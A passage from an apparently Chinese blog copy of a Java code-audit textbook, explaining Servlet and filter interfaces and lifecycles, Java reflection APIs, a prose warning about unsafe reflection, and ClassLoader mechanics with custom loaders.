class="headerlink" title="4.3.3　Servlet的接口方法"></a>4.3.3　Servlet的接口方法</h3><p>在创建Servlet文件时，开发工具会提示开发者是否创建相应的接口方法，如图4-6所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192332972.png" alt="image-20220419233232893">图4-6　创建Servlet的接口方法</p><p>HTTP 有 8 种请求方法，分别为GET、POST、HEAD、OPTIONS、PUT、DELETE、TRACE 以及 CONNECT方法。与此类似，Servlet接口中也对应着相应的请求接口：GET、POST、HEAD、OPTIONS、PUT、DELETE以及TRACE，这些接口对应着请求类型，service()方法会检查 HTTP 请求类型，然后在适当的时候调用 doGet、doPost、doPut，doDelete等方法。</p><p>Servlet 的接口方法如下。</p><h4 id="1．init-接口"><a href="#1．init-接口" class="headerlink" title="1．init() 接口"></a>1．init() 接口</h4><p>在Servlet实例化后，Servlet容器会调用init()方法来初始化该对象，主要是使Servlet 对象在处理客户请求前可以完成一些初始化工作，例如建立数据库的连接，获取配置信息等。init()方法在第一次创建 Servlet 时被调用，在后续每次用户请求时不再被调用。</p><p>init() 方法的定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192337047.png" alt="image-20220419233713002"></p><h4 id="2．service-接口"><a href="#2．service-接口" class="headerlink" title="2．service() 接口"></a>2．service() 接口</h4><p>service() 方法是执行实际任务的主要方法。Servlet容器（Web服务器）调用service()方法来处理来自客户端（浏览器）的请求，并将格式化的响应写回给客户端，每次服务器接收到一个Servlet请求时，服务器都会产生一个新的线程并调用服务。要注意的是，在service()方法被Servlet 容器调用之前，必须确保init()方法正确完成。</p><p>Service()方法的定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192338502.png" alt="image-20220419233848461"></p><h4 id="3．doGet-x2F-doPost-等接口"><a href="#3．doGet-x2F-doPost-等接口" class="headerlink" title="3．doGet()&#x2F;doPost()等接口"></a>3．doGet()&#x2F;doPost()等接口</h4><p>doGet() 等方法根据HTTP的不同请求调用不同的方法。如果HTTP 得到一个来自URL 的GET请求，就会调用 doGet() 方法；如果得到的是一个 POST 请求，就会调用doPost() 方法。</p><p>此类方法的定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192340909.png" alt="image-20220419234003858"></p><h4 id="4．destroy-接口"><a href="#4．destroy-接口" class="headerlink" title="4．destroy() 接口"></a>4．destroy() 接口</h4><p>当Servlet容器检测到一个Servlet对象应该从服务中被移除时，会调用该对象的destroy() 方法，以便Servlet对象释放它所使用的资源，保存数据到持久存储设备中。例如将内存中的数据保存到数据库中、关闭数据库连接、停止后台线程、把Cookie 列表或单击计数器写入磁盘，并执行其他类似的清理活动等。destroy() 方法与 init() 方法相同，只会被调用一次。</p><p>destroy() 方法定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201111498.png" alt="image-20220420111130311"></p><h4 id="5．getServletConfig-接口"><a href="#5．getServletConfig-接口" class="headerlink" title="5．getServletConfig() 接口"></a>5．getServletConfig() 接口</h4><p>getServletConfig() 方法返回Servlet容器调用init() 方法时传递给Servlet对象的ServletConfig对象，ServletConfig对象包含Servlet的初始化参数。开发者可以在Servlet的配置文件web.xml中，使用<init-param>标签为Servlet配置一些初始化参数：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201114169.png" alt="image-20220420111418113"></p><p>经过上面的配置，即可在Servlet中通过调用getServletConfig()，并获得一些初始化的参数。</p><h4 id="6．getServletInfo-接口"><a href="#6．getServletInfo-接口" class="headerlink" title="6．getServletInfo() 接口"></a>6．getServletInfo() 接口</h4><p>getServletInfo() 方法会返回一个 String 类型的字符串，包括关于 Servlet 的信息，如作者、版本及版权等</p><h3 id="4-3-4-Servlet-的生命周期"><a href="#4-3-4-Servlet-的生命周期" class="headerlink" title="4.3.4　Servlet 的生命周期"></a>4.3.4　Servlet 的生命周期</h3><p>我们常说的Servlet生命周期指的是Servlet从创建直到销毁的整个过程。在一个生命周期中，Servlet经历了被加载、初始化、接收请求、响应请求以及提供服务的过程，如图4-7所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201117286.png" alt="image-20220420111739236"></p><p>图4-7　Servlet生命周期</p><p>当用户第一次向服务器发起请求时，服务器会解析用户的请求，此时容器会加载Servlet，然后创建 Servet 实例，再调用init() 方法初始化Servlet，紧接着调用服务的service() 方法去处理用户 GET、POST 或者其他类型的请求。当执行完Servlet 中对应 class 文件的逻辑后，将结果返回给服务器，服务器再响应用户请求。当服务器不再需要Servlet实例或重新载入Servlet时，会调用destroy() 方法，借助该方法，Servlet可以释放掉所有在init()方法中申请的资源。</p><h2 id="4-4-Java-Web过滤器——filter"><a href="#4-4-Java-Web过滤器——filter" class="headerlink" title="4.4　Java Web过滤器——filter"></a>4.4　Java Web过滤器——filter</h2><p>filter被称为过滤器，是 Servlet 2.3新增的一个特性，同时它也是Servlet 技术中最实用的技术。开发人员通过Filter技术，能够实现对所有Web资源的管理，如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><h4 id="4-4-1-filter的配置"><a href="#4-4-1-filter的配置" class="headerlink" title="4.4.1　filter的配置"></a>4.4.1　filter的配置</h4><p>filter的配置类似于Servlet，由<filter>和<filter-mapping>两组标签组成，如图4-8所示。同样，如果Servlet版本大于3.0，也可以使用注解的方式来配置filter。</p><h4 id="1．基于web-xml的配置"><a href="#1．基于web-xml的配置" class="headerlink" title="1．基于web.xml的配置"></a>1．基于web.xml的配置</h4><p>图4-8所示是一个基于web.xml的配置。</p><p>filter 同样有很多标签，其中各个标签的含义如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;filter&gt;：指定一个过滤器。<br>&lt;filter-name&gt;：用于为过滤器指定一个名称，该元素的内容不能为空。<br>&lt;filter-class&gt;：用于指定过滤器的完整的限定类名。<br>&lt;init-param&gt;：用于为过滤器指定初始化参数。<br>&lt;param-name&gt;：为&lt;init-param&gt;的子参数，用于指定参数的名称。<br>&lt;param-value&gt;：为&lt;init-param&gt;的子参数，用于指定参数的值。<br>&lt;filter-mapping&gt;：用于设置一个filter所负责拦截的资源。<br>&lt;filter-name&gt;：为&lt;filter-mapping&gt;子元素，用于设置filter的注册名称。该值必须是在&lt;filter&gt;元素中声明过的过滤器的名称。<br>&lt;url-pattern&gt;：用于设置 filter 所拦截的请求路径（过滤器关联的URL样式）。<br>&lt;servlet-name&gt;：用于指定过滤器所拦截的Servlet名称。<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201125147.png" alt="image-20220420112548046">图4-8　filter基于web.xml的配置</p><h4 id="2．基于注解方式的配置"><a href="#2．基于注解方式的配置" class="headerlink" title="2．基于注解方式的配置"></a>2．基于注解方式的配置</h4><p>因为Servlet 的关系，在Servlet 3.0以后，开发者同样可以不用在web.xml里面配置filter，只需要添加@WebServlet注解就可以修改filter的属性，如图4-9所示，是以注解方式配置filter。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201137188.png" alt="image-20220420113739107">图4-9　filter基于注解方式的配置</p><p>可以看到第15行的@WebServlet的注解参数有description及urlPatterns，此外还有很多参数，具体如表4-3所示。</p><p>表4-3　基于注解方式配置filter的参数及其说明<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201148995.png" alt="image-20220420114847923"></p><p>由此可见，web.xml可以配置的filter属性都可以通过@WebServlet的方式进行配置。但需要注意的是，一般不推荐使用注解方式来配置 filter，因为如果存在多个过滤器，使用 web.xml配置filter可以控制过滤器的执行顺序；如果使用注解方式来配置 filter，则无法确定过滤器的执行顺序。</p><h3 id="4-4-2-filter的使用流程及实现方式"><a href="#4-4-2-filter的使用流程及实现方式" class="headerlink" title="4.4.2　filter的使用流程及实现方式"></a>4.4.2　filter的使用流程及实现方式</h3><p>filter接口中有一个doFilter方法，当开发人员编写好Filter的拦截逻辑，并配置对哪个Web资源进行拦截后，Web服务器会在每次调用Web资源的service() 方法之前先调用doFilter方法，具体流程如图4-10所示。</p><p>当用户向服务器发送 request 请求时，服务器接受该请求，并将请求发送到第一个过滤器中进行处理。如果有多个过滤器，则会依次经过filter 2，filter 3，……，filter n。接着调用Servlet 中 的 service() 方法，调用完毕后，按照与进入时相反的顺序，从过滤器filter n开始，依次经过各个过滤器，直到过滤器filter 1。最终将处理后的结果返回给服务器，服务器再反馈给用户。</p><p>filter 进行拦截的方式也很简单，在 HttpServletRequest 到达Servlet之前，filter 拦截客户的HttpServletRequest，根据需要检查 HttpServletRequest，也可以修改HttpServletRequest头和数据。在HttpServletResponse到达客户端之前，拦截HttpServletResponse，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201326323.png" alt="image-20220420132610261"></p><p>图4-10　filter的使用流程</p><h4 id="4-4-3-filter的接口方法"><a href="#4-4-3-filter的接口方法" class="headerlink" title="4.4.3　filter的接口方法"></a>4.4.3　filter的接口方法</h4><p>在创建filter文件时，开发工具会提示开发者是否创建相应的接口方法，如图4-11所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201327000.png" alt="image-20220420132753920"></p><p>图4-11　创建filter文件的相应接口方法</p><p>与Servlet 接口不同的是，filter接口在创建时就默认创建了所有的方法，这些方法如下。</p><h4 id="1．Init-接口"><a href="#1．Init-接口" class="headerlink" title="1．Init() 接口"></a>1．Init() 接口</h4><p>与Servlet中的 init() 方法类似，filter中的init() 方法用于初始化过滤器。开发者可以在 init() 方法中完成与构造方法类似的初始化功能。如果初始化代码中要用到 FillerConfig 对象，则这些初始化代码只能在 filler 的 init() 方法中编写，而不能在构造方法中编写。</p><p>init() 方法的定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201332028.png" alt="image-20220420133201976"></p><h4 id="2．doFilter-接口"><a href="#2．doFilter-接口" class="headerlink" title="2．doFilter() 接口"></a>2．doFilter() 接口</h4><p>doFilter 方法类似于 Servlet 接口的 service() 方法。当客户端请求目标资源时，容器会筛选出符合<filter-mapping> 标签中<url-pattern> 的 filter，并按照声明 <filter-mapping>的顺序依次调用这些 filter 的 doFilter() 方法。需要注意的是doFilter() 方法有多个参数，其中参数 request 和 response为 Web 服务器或 filter 链中的上一个 filter 传递过来的请求和响应对象。参数 chain 代表当前 filter 链的对象，只有在当前filter 对象中的 doFilter() 方法内部需要调用 FilterChain 对象的 doFilter() 方法时，才能把请求交付给 filter 链中的下一个filter 或者目标程序处理。</p><p>doFilter() 方法的定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201337505.png" alt="image-20220420133659217"></p><h4 id="3．destroy-接口"><a href="#3．destroy-接口" class="headerlink" title="3．destroy() 接口"></a>3．destroy() 接口</h4><p>filter 中的destroy() 方法与 Servlet 中的destroy() 作用类似，在 Web 服务器卸载 filter 对象之前被调用，用于释放被 filter对象打开的资源，如关闭数据库、关闭 I&#x2F;O 流等。</p><p>destroy() 方法的定义如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201343243.png" alt="image-20220420134359194"></p><h3 id="4-4-4-filter-的生命周期"><a href="#4-4-4-filter-的生命周期" class="headerlink" title="4.4.4　filter 的生命周期"></a>4.4.4　filter 的生命周期</h3><p>filter 的生命周期与Servlet的生命周期比较类似，指的是 filter从创建到销毁的整个过程。在一个生命周期中，filter 经历了被加载、初始化、提供服务及销毁的过程，如图 4-12 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201348339.png" alt="image-20220420134803232"></p><p>图4-12　filter 的生命周期</p><p>当Web 容器启动时，会根据 web.xml 中声明的 filter 顺序依次实例化这些 filter。然后在 Web 应用程序加载时调用init()方法，随即在客户端有请求时调用doFilter() 方法，并且根据实际情况的不同，doFilter() 方法可能被调用多次。最后在Web 应用程序卸载（或关闭）时调用destroy()方法。</p><h2 id="4-5-Java反射机制"><a href="#4-5-Java反射机制" class="headerlink" title="4.5　Java反射机制"></a>4.5　Java反射机制</h2><p>Java 反射机制可以无视类方法、变量去访问权限修饰符（如protected、private 等），并且可以调用任何类的任意方法、访问并修改成员变量值。换而言之，在能够控制反射的类名、方法名和参数的前提下，如果我们发现一处 Java 反射调用漏洞，则攻击者几乎可以为所欲为。本节来具体介绍Java 的反射机制。</p><h3 id="4-5-1-什么是反射"><a href="#4-5-1-什么是反射" class="headerlink" title="4.5.1　什么是反射"></a>4.5.1　什么是反射</h3><p>反射（Reflection）是Java的特征之一。C&#x2F;C++语言中不存在反射，反射的存在使运行中的 Java 程序能够获取自身的信息，并且可以操作类或对象的内部属性。那么什么是反射呢？</p><p>对此，Oracle 官方有着相关解释：</p><p>“Reflection enables Java code to discover informationabout the fields, methods and constructors of loadedclasses, and to use reflected fields, methods, andconstructors to operate on their underlying counterparts,within security restrictions.”（反射使Java代码能够发现有关已加载类的字段、方法和构造函数的信息，并在安全限制内使用反射的字段、方法和构造函数对其底层对应的对象进行操作。）</p><p>简单来说，通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。同样，Java的反射机制也是如此，在运行状态中，通过 Java 的反射机制，我们能够判断一个对象所属的类；了解任意一个类的所有属性和方法；能够调用任意一个对象的任意方法和属性。这种动态获取的信息以及动态调用对象的方法的功能称为Java语言的反射机制。</p><h3 id="4-5-2-反射的用途"><a href="#4-5-2-反射的用途" class="headerlink" title="4.5.2　反射的用途"></a>4.5.2　反射的用途</h3><p>反射的用途很广泛。在开发过程中使用Eclipse、IDEA等开发工具时，当我们输入一个对象或类并想调用它的属性或方法时，编译器会自动列出它的属性或方法，这是通过反射实现的；再如，JavaBean和JSP之间的调用也是通过反射实现的。反射最重要的用途是开发各种通用框架，如上文中提到的Spring框架以及ORM框架，都是通过反射机制来实现的。</p><p>面向不同的用户，反射机制的重要程度也大不相同。对于框架开发人员来说，反射虽小但作用非常大，它是各种容器实现的核心。对于一般的开发者来说，使用反射技术的频率相对较低。但总体来说，适当了解框架的底层机制对我们的编程思想也是大有裨益的。</p><h3 id="4-5-3-反射的基本运用"><a href="#4-5-3-反射的基本运用" class="headerlink" title="4.5.3　反射的基本运用"></a>4.5.3　反射的基本运用</h3><p>由于大部分Java的应用框架采用了反射机制，因此掌握Java反射机制可以提高我们的代码审计能力。</p><h4 id="1．获取类对象"><a href="#1．获取类对象" class="headerlink" title="1．获取类对象"></a>1．获取类对象</h4><p>获取类对象有很多种方法，这里提供4种。</p><h5 id="（1）使用forName-方法。"><a href="#（1）使用forName-方法。" class="headerlink" title="（1）使用forName()方法。"></a>（1）使用forName()方法。</h5><p>如果要使用Class类中的方法获取类对象，就需要使用forName() 方法，只要有类名称即可，使用更为方便，扩展性更强。图4-13所示为获取类对象的示例。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201423893.png" alt="image-20220420142355826"></p><p>图4-13　使用forName() 方法获取类对象</p><p>这种方法并不陌生，在配置JDBC的时候，我们通常采用这种方法，如图4-14所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201427858.png" alt="image-20220420142700758"></p><p>图4-14　配置JDBC</p><h5 id="（2）直接获取。"><a href="#（2）直接获取。" class="headerlink" title="（2）直接获取。"></a>（2）直接获取。</h5><p>任何数据类型都具备静态的属性，因此可以使用.class直接获取其对应的Class对象。这种方法相对简单，但要明确用到类中的静态成员，如图 4-15 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201430120.png" alt="image-20220420143030047"></p><p>图4-15　直接获取类对象</p><h5 id="（3）使用getClass-方法。"><a href="#（3）使用getClass-方法。" class="headerlink" title="（3）使用getClass() 方法。"></a>（3）使用getClass() 方法。</h5><p>我们可以通过 Object 类中的 getClass() 方法来获取字节码对象。不过这种方法较为烦琐，必须要明确具体的类，然后创建对象，如图 4-16 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201452046.png" alt="image-20220420145254964"></p><p>图4-16　使用getClass() 方法获取类对象</p><h5 id="（4）使用-getSystemClassLoader-loadClass-方法。"><a href="#（4）使用-getSystemClassLoader-loadClass-方法。" class="headerlink" title="（4）使用 getSystemClassLoader().loadClass() 方法。"></a>（4）使用 getSystemClassLoader().loadClass() 方法。</h5><p>getSystemClassLoader().loadClass() 方法与 forName() 方法类似，只要有类名称即可，但是与 forName() 方法有些区别。forName()的静态方法 JVM 会装载类，并且执行 static()中的代码；而 getSystemClassLoader().loadClass() 不会执行static()中的代码。如上文中提到的使用 JDBC，就是利用forName()方法，使 JVM 查找并加载指定的类到内存中，此时将“com.mysql.jdbc.Driver” 当作参数传入，就是告知JVM去“com.mysql.jdbc”路径下查找 Driver 类，并将其加载到内存中。具体方法如图4-17所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201457578.png" alt="image-20220420145732510"></p><p>图4-17　使用getSystemClassLoader().loadClass() 方法获取类对象</p><h4 id="2．获取类方法"><a href="#2．获取类方法" class="headerlink" title="2．获取类方法"></a>2．获取类方法</h4><p>获取某个Class对象的方法集合，主要有以下几种方法。</p><h5 id="（1）getDeclaredMethods方法。"><a href="#（1）getDeclaredMethods方法。" class="headerlink" title="（1）getDeclaredMethods方法。"></a>（1）getDeclaredMethods方法。</h5><p>getDeclaredMethods 方法返回类或接口声明的所有方法，包括public、protected、private和默认方法，但不包括继承的方法，具体方式如图4-18所示。</p><h5 id="（2）getMethods方法。"><a href="#（2）getMethods方法。" class="headerlink" title="（2）getMethods方法。"></a>（2）getMethods方法。</h5><p>getMethods方法返回某个类的所有public方法，&#x3D;&#x3D;包括其继承类的public方法&#x3D;&#x3D;，具体方式如图4-19所示。</p><h5 id="（3）getMethod方法。"><a href="#（3）getMethod方法。" class="headerlink" title="（3）getMethod方法。"></a>（3）getMethod方法。</h5><p>getMethod 方法只能返回一个特定的方法，如 Runtime 类中的exec()方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应Class的对象，具体方式如图4-20所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201501212.png" alt="image-20220420150120098"></p><p>图4-18　getDeclaredMethods 方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201504695.png" alt="image-20220420150429592"></p><p>图4-19　getMethods 方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201506401.png" alt="image-20220420150620315"></p><h5 id="图4-20-getMethod-方法"><a href="#图4-20-getMethod-方法" class="headerlink" title="图4-20　getMethod 方法"></a>图4-20　getMethod 方法</h5><p>getDeclaredMethod方法与getMethod类似，也只能返回一个特定的方法，该方法的第一个参数为方法名，第二个参数名是方法参数，具体方式如图 4-21 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201507694.png" alt="image-20220420150752483"></p><p>图4-21　getDeclaredMethod 方法</p><h4 id="3．获取类成员变量"><a href="#3．获取类成员变量" class="headerlink" title="3．获取类成员变量"></a>3．获取类成员变量</h4><p>为了更直观地体现出获取类成员变量的方法，我们首先创建一个Student类，如图4-22所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201509864.png" alt="image-20220420150935780"></p><p>图4-22　创建一个Student 类</p><p>要获取 Student 类成员变量，主要有以下几个方法</p><h5 id="（1）getDeclaredFields方法。"><a href="#（1）getDeclaredFields方法。" class="headerlink" title="（1）getDeclaredFields方法。"></a>（1）getDeclaredFields方法。</h5><p>getDeclaredFields方法能够获得类的成员变量数组，包括public、private和proteced，但是不包括父类的申明字段。具体方式如图 4-23所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201513743.png" alt="image-20220420151307125"></p><p>图4-23　getDeclaredFields方法</p><h5 id="（2）getFields方法。"><a href="#（2）getFields方法。" class="headerlink" title="（2）getFields方法。"></a>（2）getFields方法。</h5><p>getFields能够获得某个类的所有的public字段，包括父类中的字段，具体方式如图4-24所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201515087.png" alt="image-20220420151551988"></p><p>图4-24　getFields方法</p><h5 id="（3）getDeclaredField方法。"><a href="#（3）getDeclaredField方法。" class="headerlink" title="（3）getDeclaredField方法。"></a>（3）getDeclaredField方法。</h5><p>该方法与getDeclaredFields的区别是只能获得类的单个成员变量，这里我们仅想获得Student 类中的name 变量，具体方式如图4-25所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201518307.png" alt="image-20220420151849214"></p><p>图4-25　getDeclaredField 方法</p><h5 id="（4）getField方法。"><a href="#（4）getField方法。" class="headerlink" title="（4）getField方法。"></a>（4）getField方法。</h5><p>与getFields类似，getField方法能够获得某个类特定的public字段，包括父类中的字段，这里想获得 Student 类中的public类型变量content，具体方式如图 4-26 所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201519185.png" alt="image-20220420151952088"></p><p>图4-26　getField 方法</p><h3 id="4-5-4-不安全的反射"><a href="#4-5-4-不安全的反射" class="headerlink" title="4.5.4　不安全的反射"></a>4.5.4　不安全的反射</h3><p>如前所述，利用Java的反射机制，我们可以无视类方法、变量访问权限修饰符，调用任何类的任意方法、访问并修改成员变量值，但是这样做可能导致安全问题。如果一个攻击者能够通过应用程序创建意外的控制流路径，就有可能绕过安全检查发起相关攻击。假设有一段代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201530978.png" alt="image-20220420153008918"></p><p>其中存在一个字段name，当获取用户请求的name字段后进行判断时，如果请求的是 Delect 操作，则执行DelectCommand 函数；如果执行的是 Add 操作，则执行AddCommand 函数；如果不是这两种操作，则执行其他代码。</p><p>假如有开发者看到了这段代码，他认为可以使用Java 的反射来重构此代码以减少代码行，如下所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201532767.png" alt="image-20220420153206715"></p><p>这样的重构看起来使代码行减少，消除了if&#x2F;else块，而且可以在不修改命令分派器的情况下添加新的命令类型，但是如果没有对传入的name字段进行限制，就会实例化实现Command接口的任何对象，从而导致安全问题。实际上，攻击者甚至不局限于本例中的Command接口对象，而是使用任何其他对象来实现，如调用系统中任何对象的默认构造函数，或者调用Runtime对象去执行系统命令，这可能导致远程命令执行出现漏洞，因此不安全的反射的危害性极大，也是我们审计过程中需要重点关注的内容。</p><h2 id="4-6-ClassLoader类加载机制"><a href="#4-6-ClassLoader类加载机制" class="headerlink" title="4.6　ClassLoader类加载机制"></a>4.6　ClassLoader类加载机制</h2><p>Java程序是由class文件组成的一个完整的应用程序。在程序运行时，并不会一次性加载所有的class文件进入内存，而是通过Java的类加载机制（ClassLoader）进行动态加载，从而转换成java.lang.Class 类的一个实例。</p><h3 id="Java-类加载"><a href="#Java-类加载" class="headerlink" title="Java 类加载"></a>Java 类加载</h3><p>Java⽂件通过编译器变成了.class⽂件，接下来类加载器⼜将这些.class⽂件加载到JVM中。其中类装载器的作⽤其实就是类的加载。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201758729.png" alt="image-20220420175814665"></p><h3 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a><strong>类加载的过程</strong><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201759514.png" alt="image-20220420175908442"></h3><h3 id="类加载的种类"><a href="#类加载的种类" class="headerlink" title="类加载的种类"></a>类加载的种类</h3><p>Bootstrap ClassLoader(启动类加载器)这个类加载器负责将⼀些核⼼的，被JVM识别的类加载进来，⽤C++实现，与JVM是⼀体的。</p><p>Extension ClassLoader(扩展类加载器)这个类加载器⽤来加载 Java 的扩展库</p><p>Applicaiton ClassLoader(App类加载器&#x2F;系统类加载器)⽤于加载我们⾃⼰定义编写的类User ClassLoader （⽤户⾃⼰实现的加载器）当实际需要⾃⼰掌控类加载过程时才会⽤到，⼀般没有⽤到。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201801862.png" alt="image-20220420180103781"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201801026.png" alt="image-20220420180116941"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201801601.png" alt="image-20220420180130533"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201801612.png" alt="image-20220420180155544"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201802179.png" alt="img"></p><p>方法说明</p><p>getParent()返回该类加载器的父类加载器</p><p>loadClass(String name)加载名称为 name 的类，返回的结果是 java.lang.Class类的实例</p><p>findClass(String name)查找名称为 name 的类，返回的结果是 java.lang.Class类的实例</p><p>findLoadedClass(String name)查找名称为 name 的已经被加载过的类，返回的结果是java.lang.Class 类的实例</p><p>defineClass(String name, byte[] b, int off, int len)把字节数组 b 中的内容转换成 Java 类，返回的结果是java.lang.Class 类的实例，该方法被声明为 final</p><p> resolveClass(Class&lt;?&gt; c)链接指定的 Java 类</p><h3 id="双亲委托机制"><a href="#双亲委托机制" class="headerlink" title="双亲委托机制"></a><strong>双亲委托机制</strong></h3><p>• 定义：如果⼀个类加载器收到了类加载的请求，它⾸先不会⾃⼰去尝试加载这个类，⽽是把这个请求委派给⽗类加载器去完成，每⼀个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到顶层的启动类加载器中，只有当⽗加载器反馈⾃⼰⽆法完成这个加载请求（它的搜索范围中没有找到所需的类）时，⼦加载器才会尝试⾃⼰去加载。这个机制就叫双亲委派机制。</p><p>• 双亲委派机制的实现</p><p>\1. ⾸先，检查请求的类是否已经被加载过了</p><p>\2. 未加载，则请求⽗类加载器去加载对应路径下的类，</p><p>\3. 如果加载不到，才由下⾯的⼦类依次去加载。</p><p>• Java.lang.Stringà本地加载器à扩展加载器à根加载器</p><h3 id="4-6-1-ClassLoader类"><a href="#4-6-1-ClassLoader类" class="headerlink" title="4.6.1　ClassLoader类"></a>4.6.1　ClassLoader类</h3><p>ClassLoader是一个抽象类，主要的功能是通过指定的类的名称，找到或生成对应的字节码，返回一个java.lang.Class 类的实例。开发者可以继承ClassLoader类来实现自定义的类加载器。</p><p>ClassLoader类中和加载类相关的方法如表4-4所示。</p><p>表4-4　ClassLoader类中和加载类相关的方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201538119.png" alt="image-20220420153828043"></p><h4 id="4-6-2-loadClass-方法的流程"><a href="#4-6-2-loadClass-方法的流程" class="headerlink" title="4.6.2　loadClass()方法的流程"></a>4.6.2　loadClass()方法的流程</h4><p>前面曾介绍过loadClass()方法可以加载类并返回一个java.lang.Class类对象。通过如下源码可以看出，当loadClass()方法被调用时，会首先使用findLoadedClass()方法判断该类是否已经被加载，如果未被加载，则优先使用加载器的父类加载器进行加载。当不存在父类加载器，无法对该类进行加载时，则会调用自身的findClass()方法，&#x3D;&#x3D;因此可以重写findClass()方法来完成一些类加载的特殊要求&#x3D;&#x3D;。该方法的代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201544665.png" alt="image-20220420154449590"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201544744.png" alt="image-20220420154459681"></p><h3 id="4-6-3-自定义的类加载器"><a href="#4-6-3-自定义的类加载器" class="headerlink" title="4.6.3　自定义的类加载器"></a>4.6.3　自定义的类加载器</h3><p>根据loadClass()方法的流程，可以发现通过重写findClass()方法，利用defineClass()方法来将字节码转换成java.lang.class类对象，就可以实现自定义的类加载器。示例代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201607803.png" alt="image-20220420160743730"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201607628.png" alt="image-20220420160756560"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201608931.png" alt="image-20220420160806877"></p><p>该示例代码的执行结果如图4-27所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201608030.png" alt="image-20220420160844933"></p><p>图4-27　自定义类加载器示例代码执行结果<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201817931.png" alt="image-20220420181751886"></p><p>分析一下流程 代码从下网上</p><p>findclass(name) -&gt; this.name -&gt; name -&gt;  name:sayHello -&gt; 外部目录找父类 - &gt; 在Hello中找到了sayHello</p><p>findclass(name) -&gt; 通过字节串调用defindclass重新生成新的classloader类</p><h3 id="用户自己实现的加载器"><a href="#用户自己实现的加载器" class="headerlink" title="用户自己实现的加载器"></a><strong>用户自己实现的加载器</strong><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201827663.png" alt="img"></h3><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204201835448.png" alt="img"></p><h3 id="4-6-4-loadClass-方法与Class-forName的区别"><a href="#4-6-4-loadClass-方法与Class-forName的区别" class="headerlink" title="4.6.4　loadClass()方法与Class.forName的区别"></a>4.6.4　